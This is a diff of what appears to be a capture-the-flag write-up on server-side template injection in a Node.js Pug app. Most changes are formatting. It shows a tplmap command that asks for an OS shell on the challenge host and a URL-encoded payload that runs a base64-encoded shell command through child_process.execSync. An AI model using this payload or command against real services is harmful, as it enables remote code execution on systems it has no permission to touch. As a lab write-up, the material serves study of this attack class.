@@ -49,8 +49,7 @@ app.listen(3000, () => console.log(':3000'));
 $ ./tplmap.py --engine pug --os-shell -u "http://h4ck3r.quest:8008/?name=bob"
 ```
 
-* Using wireshark to trace the payload
-You must let the template by like:
+* Using wireshark to trace the payload. You must let the template be like:
     ```javascript
     const template = `
     h1 Hello %NAME%
@@ -63,9 +62,10 @@ You must let the template by like:
       a(href='/source') Source Code
     `;
     ```
-    Including a new line and an equal sign
-    Payload:
-    `%0A%3D%20global.process.mainModule.require%28%27child_process%27%29.execSync%28Buffer%28%27bHM%3D%27%2C%2B%27base64%27%29.toString%28%29%29`
+    Including a new line and an equal sign, Payload:
+    ```bash
+    %0A%3D%20global.process.mainModule.require%28%27child_process%27%29.execSync%28Buffer%28%27bHM%3D%27%2C%2B%27base64%27%29.toString%28%29%29
+    ````
     which is
     ```
 
